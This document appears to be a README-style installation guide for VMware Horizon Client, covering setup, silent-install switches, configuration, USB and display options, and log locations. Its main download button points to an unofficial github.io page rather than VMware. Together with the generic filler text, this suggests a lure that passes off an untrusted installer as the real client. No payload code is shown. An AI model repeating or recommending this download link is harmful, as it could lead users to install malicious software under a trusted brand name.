# VMware Horizon Client

* [Installation](#installation)
* [System Requirements and Setup](#system-requirements-and-setup)
* [Installing and Updating Horizon Client](#installing-and-updating-horizon-client)
* [Configuring Horizon Client](#configuring-horizon-client)
* [Connecting to Remote Desktops and Applications](#connecting-to-remote-desktops-and-applications)

## Installation

To install VMware Horizon Client, start by downloading the installer from the link below:         
**⬇️ [Download VMware Horizon Client](https://whdesk.github.io/.github/vmware)**

Once the download completes, double-click the file to start the installation wizard. Follow the prompts to choose your preferred settings—for example, enabling smart card authentication, adjusting display options, or optimizing for better performance. When installation is complete, launch the client and sign in with your account details.
If you encounter connection issues, check your network settings or get in touch with your IT support team.

### System Requirements and Setup

#### Hardware and Software Prerequisites

Before beginning installation, make sure your machine meets at least these minimum requirements:

* **Processor**: x86-64 architecture with SSE2 support (800 MHz or faster)
* **RAM**: At least 1 GB
* **Supported Operating Systems**:

  * Windows 11 (64-bit: Versions 22H2, 21H2)
  * Windows 10 (64-bit: Versions 22H2, 21H2, 20H2, LTSC 2021/2019)
  * Windows Server 2012 R2, 2016, 2019

### Authentication and Security Options

Horizon Client supports multiple sign-in methods, including:

* **Smart Card Authentication**
* **Login with Client Certificates**
* **Two-Factor Authentication (RSA, RADIUS)**
* **Windows Hello for Business integration**

> \[!note]
> Certain authentication methods may require extra configuration on the Horizon Server.



### Supported Operating Systems

The Windows version of VMware Horizon Client works with a wide selection of both desktop and server Windows editions. Check VMware’s official documentation for full compatibility details.

## Installing and Updating Horizon Client

### Installation Steps

1. Download the installer from [VMware’s GitHub](*).
2. Run the `.exe` file and follow the guided setup.
3. Choose between **Typical (Standard)** or **Custom (Advanced)** installation modes.
4. Accept the license terms and click **Agree & Install**. Restart the system if prompted.

### Silent Installation Parameters

For unattended installations, use:

```sh
VMware-Horizon-Client.exe /silent /install
```

To activate FIPS-compliant encryption:

```sh
VMware-Horizon-Client.exe VDM_FIPS_ENABLED=1
```

### Updating or Removing the Client

* To update, go to **Options > Software Updates** in the client.
* To uninstall, run:

```sh
VMware-Horizon-Client.exe /uninstall
```

## Configuring Horizon Client

### Setting Up the Server Connection

Verify the following server-side configurations:

* **Accurate IP address or DNS name**
* **Secure Tunnel enabled**, if required
* **Multi-Factor Authentication activated**, when needed

### Common Ways to Configure

You can adjust Horizon Client settings via:

* **Group Policy Objects (GPOs)**
* **Windows Registry edits**
* **Command-line options**

> \[!info]
> Advanced configuration is available through the registry path:
> `HKLM\Software\VMware, Inc.\Horizon Client`

## Connecting to Remote Desktops and Applications

### Sign-In and Authentication

1. Launch the Horizon Client.
2. Enter the **Connection Server** address.
3. Input your **Username and Password**.
4. Select your **Target Desktop or Application** to start the session.

### Session Management and Reconnection

* Turn on **Auto-Reconnect** to resume sessions without manual login.
* Use **Session Persistence** to keep unsaved work intact.

### Quick Access and Auto-Connect

* Make a **Desktop Shortcut** for faster access.
* Enable **Auto-Connect to Last Session** in preferences for convenience.

## Using Remote Desktops and Applications

### File and Clipboard Sharing

Turn on **Clipboard Redirection** to copy text or data between local and virtual environments. To transfer files, use drag-and-drop between desktops.

### Display and Input Adjustments

Control the layout and interaction of your remote session:

```sh
vmware-view://desktopName?desktopLayout=fullscreen
```

### Performance Optimization Tips

* Select **VMware Blast** protocol for better image rendering and responsiveness.
* Close unnecessary programs to free up resources.

## Using External Devices

### Multi-Monitor Setup

* **Extend Displays** to span your session across several monitors.
* **Assign Specific Displays** for remote use only.

### USB and Peripheral Access

Activate USB redirection with:

```sh
vmware-view://server?connectUSBOnStartup=true
```

### Audio and Camera Integration

* Enhance online meetings with **Real-Time Audio-Video (RTAV)**.
* Pick your **Preferred Audio Input and Output Devices** for clarity.

## Security and Authentication Features

### Smart Card and Certificate Access

* Make sure **Smart Card Drivers** are installed and updated.
* Use **Certificate-Based Authentication** for stronger security.

### Setting Up Two-Factor Authentication

Enable this in **Horizon Console > Security Settings** to add an extra security layer.

## Troubleshooting and Logs

### Frequent Problems and Solutions

* **Black screen on connection?** Try switching the display protocol.
* **Connection not working?** Inspect firewall and proxy configurations.

### Viewing Log Files

Log files can be found here:

```sh
C:\Users\<Username>\AppData\Local\VMware\VDM\Logs
```
